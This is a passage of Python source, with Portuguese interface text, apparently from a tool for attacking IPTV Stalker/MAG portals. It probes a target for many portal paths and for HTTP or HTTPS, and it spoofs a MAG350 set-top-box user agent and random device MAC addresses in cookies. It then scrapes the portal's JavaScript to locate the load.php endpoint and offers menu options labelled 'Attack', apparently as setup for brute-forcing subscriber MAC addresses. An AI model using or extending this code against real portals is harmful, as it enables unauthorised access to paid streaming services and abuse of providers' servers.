    vrdata = clfe = clfc = vrdX = phpX = PHPa = PHPv = ""
    os.system("cls" if os.name == "nt" else "clear")
proxyslen = 0
headers = {}
HTTPFAIL = PHPURL = mtype = ss = ssx = pano = stbb = uzmanm = uzmanmc = uzmanmz = realblue = albstb2 = albstb3 = agentx = attack = uzmanmx = useragent = ''
http = 'http'
os.system("cls" if os.name == "nt" else "clear")
os.system("cls" if os.name == "nt" else "clear")
print(PRL)
print("""         
""")
panel = str(panel0)
if panel == '':
    print("""
[0mErro: A URL do portal não pode estar vazia!""")
    quit()
panel = panel.replace('https://', '')
panel = panel.replace('http://', '')
panel = panel.replace('/c/', '')
BASE_Panel = panel
if '/' in panel:
    panels = panel.split('/')[0]
    panels = panels.replace('/c', '')
    panels = panels.replace('/', '')
    panels = panels.replace(' ', '')
else:
    panels = panel
tags = ['https://', 'http://', '/stalker_portal', '/rmxportal', '/cmdforex', '/portalstb', '/magLoad', '/maglove', '/client', '/portalmega', '/ministra', '/korisnici', '/ghandi_portal', '/magaccess', '/blowportal', '/emu2', '/emu', '/tek', '/Link_OK', '/bs.mag.portal', '/bStream', '/delko', '/portal', '/c/']
for tag in tags:
    panels = panels.replace(tag, '')
URLS = panels
BASE_URL = panels
os.system("cls" if os.name == "nt" else "clear")
os.system("cls" if os.name == "nt" else "clear")
print(f'  {GREEN}Verificação Automática do Portal & Protocólo {RESET}')
print('\33[38;5;226m       Por favor, aguarde...[Depuração->] \x1b[0m')
def check_http(url):
    HTTP_URL = f'http://{url}'
    try:
        HTTP_URL = urlparse(HTTP_URL)
        connection = HTTPConnection(HTTP_URL.netloc, timeout=2)
        connection.request('HEAD', HTTP_URL.path)
        if connection.getresponse():
            return True
        return False
    except:
        return False
        return None
def check_https(url):
    HTTPS_URL = f'https://{url}'
    try:
        HTTPS_URL = urlparse(HTTPS_URL)
        connection = HTTPSConnection(HTTPS_URL.netloc, timeout=3)
        connection.request('HEAD', HTTPS_URL.path)
        if connection.getresponse():
            return True
        return False
    except:
        return False
        return None
print(PRL,"\n")
if __name__ == '__main__':
    if check_http(BASE_URL):
        http = 'http'
        os.system("cls" if os.name == "nt" else "clear")
        print(PRL,"\n")
        print(f'  {PURPLEa}╓➛Host: {BASE_URL} {RESET}')
        print(f'  {PURPLEa}╙➛ {YELLOW}HTTP {PURPLEa}Protocólo ➛ Host  {GREEN}ONLINE {RESET}')
        printxi = f'  {PURPLEa}╓➛Host: {BASE_URL} {RESET}\n  {PURPLEa}╙➛ {YELLOW}HTTP {PURPLEa}Protocólo ➛ Host  {GREEN}ONLINE {RESET}'
        print('\33[38;5;226m     Por favor, aguarde --> [Depuração] \x1b[0m')
    elif check_https(BASE_URL):
        http = 'https'
        os.system("cls" if os.name == "nt" else "clear")
        print(PRL,"\n")
        print(f'  {PURPLEa}╓➛Host: {BASE_URL} {RESET}')
        print(f'  {PURPLEa}╙➛ {YELLOW}HTTPS {PURPLEa}Protocólo ➛ Host  {GREEN}ONLINE {RESET}')
        printxi = f'  {PURPLEa}╓➛Host: {BASE_URL} {RESET}\n  {PURPLEa}╙➛ {YELLOW}HTTPS {PURPLEa}Protocólo ➛ Host  {GREEN}ONLINE {RESET}'
        print('\33[38;5;226m     Por favor, aguarde --> [Depuração] \x1b[0m')
    else:
        http = 'http'
        HTTPFAIL = 'FALHA'
        print(f'  {REDa}╓➛FALHA ao verificar o protocolo?!! {RESET}')
        print(f'  {REDa}╙➛DICA: Use Proxy e continue. {RESET}')
        printxi = f'''  {REDa}╓➛FALHA ao verificar o protocolo?!! {RESET}\n  {REDa}╙➛DICA: Use Proxy e continue. {RESET}'''
        print('\33[38;5;226m     Por favor, aguarde...[Depuração] \x1b[0m')
macx = '00%3A1A%3A79%3A00%3A00%3A00'
try:
    macx = '00:1A:79:%02X:%02X:%02X' % (random.randint(0, 256), random.randint(0, 256), random.randint(0, 256))
    macx = macx.replace(':100', ':10')
    macx = macx.upper().replace(':', '%3A')
except:
    pass
HEADERAb = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG350 stbapp ver: 4 rev: 2721 Mobile Safari/533.3', 'Referer': http + '://' + BASE_Panel + '/c/', 'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Cookie': 'mac=' + macx + '; stb_lang=en; timezone=Europe%2FParis;', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded,text/javascript;charset=UTF-8', 'Connection': 'Keep-Alive', 'X-User-Agent': 'Model: MAG350; Link: Ethernet'}
def check_aurora(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/aurora'
    PHPURL = f'{URLS}/aurora'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_portalu(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/portal'
    PHPURL = f'{URLS}/portal'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_rmxportal(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/rmxportal'
    PHPURL = f'{URLS}/rmxportal'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_cmdforex(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/cmdforex'
    PHPURL = f'{URLS}/cmdforex'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_normal(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}'
    PHPURL = URLS
    try:
        connection = option.get(PHP_URL + '/c/version.js', headers=HEADERAb, timeout=2)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_stalker_portal(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/stalker_portal'
    PHPURL = f'{URLS}/stalker_portal'
    try:
        connection = option.get(PHP_URL + '/c/version.js', headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_stalker_portal_c_(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/stalker_portal/c_/'
    PHPURL = f'{URLS}/stalker_portal/c_'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_stalker_portal_stb_(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/stalker_portal/stb'
    PHPURL = f'{URLS}/stalker_portal/stb'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_portalstb(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/portalstb'
    PHPURL = f'{URLS}/portalstb'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_maglove(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/maglove'
    PHPURL = f'{URLS}/maglove'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_client(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/client'
    PHPURL = f'{URLS}/client'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_magportal(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/magportal'
    PHPURL = f'{URLS}/magportal'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_magaccess(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/magaccess'
    PHPURL = f'{URLS}/magaccess'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_powerfull(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/powerfull'
    PHPURL = f'{URLS}/powerfull'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_ministra(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/ministra'
    PHPURL = f'{URLS}/ministra'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_korisnici(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/korisnici'
    PHPURL = f'{URLS}/korisnici'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_ghandi_portal(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/ghandi_portal/c/'
    PHPURL = f'{URLS}/ghandi_portal'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_blowportal(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/blowportal'
    PHPURL = f'{URLS}/blowportal'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_extraportal(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/extraportal'
    PHPURL = f'{URLS}/extraportal'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_bs_mag_portal(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/bs.mag.portal'
    PHPURL = f'{URLS}/bs.mag.portal'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_Link_OK(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/Link_OK'
    PHPURL = f'{URLS}/Link_OK'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_bStream(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/bStream'
    PHPURL = f'{URLS}/bStream'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_delko(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/delko/'
    PHPURL = f'{URLS}/delko'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_emu2(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/emu2/'
    PHPURL = f'{URLS}/emu2'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_emu(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/emu/'
    PHPURL = f'{URLS}/emu'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_mag(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/mag/'
    PHPURL = f'{URLS}/mag'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_tek(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/tek/'
    PHPURL = f'{URLS}/tek'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_c_(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/c_/'
    PHPURL = f'{URLS}/c_'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_kk(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/k/'
    PHPURL = f'{URLS}/k'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_cp(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/cp/'
    PHPURL = f'{URLS}/cp'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
def check_pp_(URLS):
    global PHPURL
    PHP_URL = f'{http}://{URLS}/p/'
    PHPURL = f'{URLS}/p'
    try:
        connection = option.get(PHP_URL, headers=HEADERAb, timeout=2, verify=None)
        if connection.status_code == 200:
            return True
        return False
    except:
        return False
vrdata = '5.6.6'
vrdataC = f' {YELLOW}| {MAGENTA}v{vrdata}'
if not panel == '':
    phpdata = ''
    phpdata2 = ''
    phptitle = ''
    stalker_ = ''
    infophp = ''
    phpauto = ''
    phptit = ''
    info = ''
    phpX = ''
    phpd = ''
    down = ''
    clfe = ''
    ccff = ''
    cse = ''
    sp = ''
    cf = ''
    cc = ''
    HTTP_HTTP = 'False'
    HTTPS_HTTPS = 'False'
    if check_normal(URLS):
        panels = f'{PHPURL}/c/'
        panel = PHPURL
        phpX = ''
        phpdata2 = 'server/load.php'
    elif check_magaccess(URLS):
        panels = f'{PHPURL}/c/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_powerfull(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_ministra(URLS):
        panels = f'{PHPURL}/c/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_portalstb(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_maglove(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_client(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_magportal(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_korisnici(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_blowportal(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_extraportal(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_rmxportal(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_cmdforex(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_ghandi_portal(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_bs_mag_portal(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_Link_OK(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_bStream(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_delko(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_emu2(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_emu(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_mag(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_tek(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_portalu(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_aurora(URLS):
        panels = f'{PHPURL}/c/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_c_(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_kk(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_cp(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_pp_(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = 'PHP'
    elif check_stalker_portal_c_(URLS):
        panels = f'{PHPURL}/c/'
        panel = PHPURL
        phpX = ''
        stalker_ = 'stalker_portal'
        phpdata2 = 'server/load.php'
    elif check_stalker_portal_stb_(URLS):
        panels = f'{PHPURL}/'
        panel = PHPURL
        phpX = ''
        stalker_ = 'stalker_portal'
        phpdata2 = 'server/load.php'
    elif check_stalker_portal(URLS):
        panels = f'{PHPURL}/c/'
        panel = PHPURL
        phpX = ''
        stalker_ = 'stalker_portal'
        phpdata2 = 'server/load.php'
    elif check_stalker_portal(URLS) and check_normal(URLS):
        panels = f'{PHPURL}/c/'
        panel = PHPURL
        phpX = ''
        phpdata2 = 'server/load.php'
    elif check_normal(URLS):
        panels = f'{PHPURL}/c/'
        panel = PHPURL
        phpX = ''
    else:
        panel = panels
        panels = f'{panels}/c/'
        phpX = ''
    HEADERAc = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02', 'Referer': http + '://' + panel + '/c/', 'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Cookie': 'mac=' + macx + '; stb_lang=en; timezone=Europe%2FParis;', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'X-User-Agent': 'Model: MAG350; Link: Ethernet'}
    if HTTPFAIL == 'FAILED':
        HTTPX = f'http://{panels}'
        HTTPSX = f'https://{panels}'
        try:
            connection = option.get(HTTPX, headers=HEADERAc, timeout=2)
            if connection.status_code == 200:
                HTTP_HTTP = 'True'
            else:
                HTTP_HTTP = 'False'
            connection = option.get(HTTPSX, headers=HEADERAc, timeout=2)
            if connection.status_code == 200:
                HTTPS_HTTPS = 'True'
            else:
                HTTPS_HTTPS = 'False'
        except:
            pass
        if HTTPS_HTTPS == 'True':
            http = 'https'
            HTTPFAIL = ''
            os.system("cls" if os.name == "nt" else "clear")
            print(f'  {PURPLEa}╓➛Host: {BASE_URL} {RESET}')
            print(f'  {PURPLEa}╙➛ {YELLOW}HTTPS {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}')
            printxi = f'  {PURPLEa}╓➛Host: {BASE_URL} {RESET}\n  {PURPLEa}╙➛ {YELLOW}HTTPS {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}'
            print('\33[38;5;226m         [Debugging-OK] \x1b[0m')
        elif HTTP_HTTP == 'True':
            http = 'http'
            HTTPFAIL = ''
            os.system("cls" if os.name == "nt" else "clear")
            print(f'  {PURPLEa}╓➛Host: {BASE_URL} {RESET}')
            print(f'  {PURPLEa}╙➛ {YELLOW}HTTP {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}')
            printxi = f'  {PURPLEa}╓➛Host: {BASE_URL} {RESET}\n  {PURPLEa}╙➛ {YELLOW}HTTP {PURPLEa}Protocol ➛ Host  {GREEN}ONLINE {RESET}'
            print('\33[38;5;226m         [Debugging-OK] \x1b[0m')
        else:
            HTTPFAIL = 'FAILED'
            os.system("cls" if os.name == "nt" else "clear")
            print(f'  {REDa}╓➛FALHA ao verificar o protocolo?!! {RESET}')
            print(f'  {REDa}╙➛DICA: Use Proxy e continue. {RESET}')
            printxi = f'  {REDa}╓➛FALHA ao verificar o protocolo?!! {RESET}\n  {REDa}╙➛DICA: Portal fora do ar ou IP bloqueado! {RESET}'
            print('\33[38;5;226m           Por favor, aguarde... \x1b[0m')
    else:
        os.system("cls" if os.name == "nt" else "clear")
        print(printxi)
        print(f'\n  {GREEN}╓Este é o Sub-Portal correto {RESET}')
        print(f'  {GREEN}╙{MAGENTA}{http}://{panel} {RESET}')
        print(f'\n  {YELLOW}╓Tentando coletar os DADOS do Portal {RESET}')
        print('\33[38;5;226m           Por favor, aguarde... \x1b[0m')
    try:
        phptitle = str(option.get(http + '://' + panels, headers=HEADERAc, timeout=2, verify=None).text.split('<title>')[1].split('<')[0] + '\n')
        if 'cloudflare' in phptitle:
            ccff = 'CloudFlare'
            phptit = 'OKK'
        if 'NXT' in phptitle:
            cc = '[NXT]'
            phptit = 'NXT'
            phpdata2 = 'c/portal.php'
        elif 'stalker_portal' in phptitle or 'stalker' in phptitle:
            phpdata2 = 'server/load.php'
            cse = '\x1b[90m[Stalker_Portal] \x1b[0m'
            phptit = 'Stalker'
        elif 'portal' in phptitle or 'Portal' in phptitle or 'PORTAL' in phptitle:
            phpdata2 = 'portal.php'
            cse = '\x1b[90m[Portal] \x1b[0m'
            phptit = 'Portal'
        elif 'Loading...' in phptitle:
            phptit = 'Loading...'
            phpdata2 = 'server/load.php'
        elif 'Access denied' in phptitle:
            cse = '\x1b[91m[Access Denied] \x1b[0m'
            phptit = ''
        elif 'server is down' in phptitle:
            down = '\x1b[91m[Portal DOWN] \x1b[0m'
            phptit = ''
        elif '<!DOCTYPEHTMLPUBLIC' in phptitle or ('403Forbidden' in phptitle or ('404 Not Found' in phptitle or ('404NotFound' in phptitle or '!DOCTYPE' in phptitle))) or phptitle == '':
            down = '\x1b[91m[Blocked-IP] \x1b[0m'
            phptit = ''
        else:
            try:
                connection = option.get(http + '://' + panel, timeout=2)
            except:
                pass
            if connection.status_code == 200:
                phptit = 'OKK'
            else:
                phptit = ''
        phpdata = str(option.get(http + '://' + panels + 'xpcom.common.js', headers=HEADERAc, timeout=4, verify=None).text.replace(' ', ''))
        if 'this.user' not in phpdata and '/' not in panel:
            panels = f'{panel}/stalker_portal/c/'
            panel = f'{panel}/stalker_portal'
            try:
                phpdata = str(option.get(http + '://' + panels + 'xpcom.common.js', headers=HEADERAc, timeout=4, verify=None).text.replace(' ', ''))
                if 'this.user' not in phpdata:
                    phpdata = ''
                    panel = BASE_Panel
                    panels = f'{BASE_Panel}/c/'
            except:
                pass
        phpd = phpdata
        if "+this.portal_ip+'/" in phpdata:
            phpdata = phpdata.split("portal_ip+'/")[1].split("';")[0]
            if "+this.portal_path+'" in phpdata:
                phpdata = phpdata.split("+'/")[1].split("';")[0]
        elif "+this.portal_path+'" in phpd:
            phpdata = phpdata.split("+'/")[1].split("';")[0]
        elif 'portal.php' in phpd and phptit == 'NXT':
            phpdata = 'c/portal.php'
        elif 'portal.php' in phpd and phptit == 'Portal':
            phpdata = 'portal.php'
        elif 'server/load.php' in phpd and phptit == 'NXT':
            phpdata = 'c/server/load.php'
        elif 'stalker_portal' in phpd or phptit == 'Stalker':
            phpdata = 'server/load.php'
        elif 'c/server/load.php' in phpd:
            phpdata = 'c/server/load.php'
        elif stalker_ == '' and phptit == 'Stalker':
            phpdata = 'stalker_portal/server/load.php'
        else:
            phpdata = ''
        if 'cloudflare' in phpd or ccff == 'CloudFlare':
            cf = '\x1b[91m[CloudFlare] \x1b[0m'
        if not cse == '' or (not cf == '' or not cc == '') or not down == '':
            info = '\x1b[90m╙' + str(cse + cc + cf + down)
            infophp = str(cse + cc + cf + down)
        phpdata = phpdata.replace(' ', '')
        vrdata = str(option.get(http + '://' + panels + 'version.js', headers=HEADERAc, timeout=2, verify=None).text.replace(' ', ''))
        if "ver='" in vrdata:
            vrdata = vrdata.replace('\n', '')
            vrdata = vrdata.split("'")[1].split("'")[0]
            vrdata = vrdata.replace(' ', '')
            vrdataC = f' {YELLOW}| {MAGENTA}v{vrdata}'
        else:
            vrdata = '5.6.6'
            vrdataC = f' {YELLOW}| {MAGENTA}v{vrdata}'
    except:
        pass
    Automatic = ''
    if 'stalker_portal' in panel:
        if phpdata == 'portal.php':
            phpdata = 'server/load.php'
        if phpdata == 'c/portal.php':
            phpdata = 'c/server/load.php'
    if phpdata == 'portal.php' and phptit == 'Stalker':
        phpdata = 'server/load.php'
    if phptit == 'Portal' and 'XUI' in vrdata:
        phpdata = f'c/{phpdata}'
    if cc == '[NXT]':
        phpdata = f'c/{phpdata}'
    if phpdata == '':
        if phpX == 'PHP':
            phpdata = 'portal.php'
        if not phpdata2 == '':
            phpdata = str(phpdata2)
    if vrdata == '' or vrdata == ' ':
        vrdata = '5.6.6'
        vrdataC = f' {YELLOW}| {MAGENTA}v{vrdata}'
    os.system("cls" if os.name == "nt" else "clear")
    panel = panel.replace('/c/', '')
    print(printxi)
    print(f'\n  {GREEN}╓Este é o Sub-Portal correto {RESET}')
    print(f'  {GREEN}╙{MAGENTA}{http}://{panel} {RESET}')
    print(f'\n  {YELLOW}╓Tentando coletar os DADOS do Portal {RESET}')
    if not phpdata == '' or not phptit == '':
        Automatic = 'ON'
        if phpdata == '':
            print(f'  {YELLOW}╓{GREEN}SUCESSO➛ Dados do Portal Coletados! {RESET}')
        else:
            print(f'  {YELLOW}╠[{MAGENTA} {phpdata}{vrdataC} {YELLOW}]{RESET}')
            print(f'  {YELLOW}╙{GREEN}SUCESSO➛ Dados do Portal Coletados! {RESET}')
        if HTTPFAIL == 'FAILED':
            HTTPFAIL = 'FAILED2'
        phhp = input("""[96m
   [33m1 = Aᴜᴛᴏᴍᴀᴛɪᴄ•ULTIMAXv³=[32m[ON] [32m
       """ + str(info) + """ [0m
   [96m2 = Cᴏɴᴛɪɴᴜᴇ ᴡɪᴛʜ ᴍᴀɴᴜᴀʟ-ᴘʜᴘ [0m
   [40mResposta = [0m[31m[31m""")
    else:
        if not phpX == 'PHP':
            panel = BASE_Panel
        Automatic = 'OFF'
        tags2 = ['https://', 'http://', '/c/', ' ']
        for tag in tags2:
            panel = panel.replace(tag, '')
        if phpdata == '':
            print(f'  {YELLOW}╙{REDa}FALHA➛ Coletando DADOS DO Portal! {RESET}')
        else:
            print(f'  {YELLOW}╠[{GREYa} {phpdata}{vrdataC} {YELLOW}]{RESET}')
            print(f'  {YELLOW}╙{REDa}FALHA➛ Coletando DADOS DO Portal! {RESET}')
        if HTTPFAIL == 'FAILED':
            HTTPFAIL = 'FAILED2'
        phhp = input("""[96m
   [90m1 = Aᴜᴛᴏᴍᴀᴛɪᴄ•sᴛʙᴍᴀx=[OFF]
       """ + str(info) + """ [0m
   [96m2 = Cᴏɴᴛɪɴᴜᴇ ᴡɪᴛʜ ᴍᴀɴᴜᴀʟ-ᴘʜᴘ [0m
   [40mResposta = [0m[31m[31m""")
if phhp != "2":
    phhp = "1"
if HTTPFAIL == 'FAILED2':
    os.system("cls" if os.name == "nt" else "clear")
    xhttpx = input("""[0;1m   Automatic Protocol check has FAILED!
     So, select manual Portal Protocol! [0m
   [31mMost of portals use the \"HTTP\", but
   some portals are \"HTTPS\" protocols. [0m
   [33mᴅᴇғᴀᴜʟᴛ ɪs = 1 [0m
[36m
   1 - HTTP
   2 - HTTPS
[0m
[31m   Resposta = [0m[0m[0m""")
    if xhttpx == '2':
        http = 'https'
    else:
        http = 'http'
if phhp == '':
    print("""
[0mErrado: PHP não pode estar vazio, nem ser 1 ou 2!""")
    quit()
if phhp == '1':
    phhp = '99'
else:
    os.system("cls" if os.name == "nt" else "clear")
    print('\x1b[0m')
    phhp = ''
    phhp = input("""
     0 [1;32m=⫸ [0m [33mᴀᴅᴅ-ᴄᴜsᴛᴏᴍ.ᴘʜᴘ [0m
     1 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴼᴸᴰ⁾ [0m
     2 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴬᵗᵗᵃᶜᵏ⁾ [0m
     3 [1;32m=⫸ [0m [33m[ᴄ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᶜˡᵒᵘᵈ⁾ [0m
     4 [1;32m=⫸ [0m [33m[x]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᴷᶜ⁾ [0m
     5 [1;32m=⫸ [0m [33m[ʀ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴬᵀᴼᴹ⁾ [0m
     6 [1;32m=⫸ [0m [33m[ᴜʟ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᵁᴸᵀᴿᴬ⁾ [0m
     7 [1;32m=⫸ [0m [33m[xɢ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴳᴼᴸᴰ⁾ [0m
     8 [1;32m=⫸ [0m [33m[ɴxᴛ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴳᴴᴼˢᵀ⁾ [0m
     9 [1;32m=⫸ [0m [33msᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴼᴸᴰ⁾ [0m
    10 [1;32m=⫸ [0m [33msᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴬᵗᵗᵃᶜᵏ⁾ [0m
    11 [1;32m=⫸ [0m [33m[x]sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᴷᶜ²⁾ [0m
    12 [1;32m=⫸ [0m [33m[ᴄ]sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᶜˡᵒᵘᵈ⁾ [0m
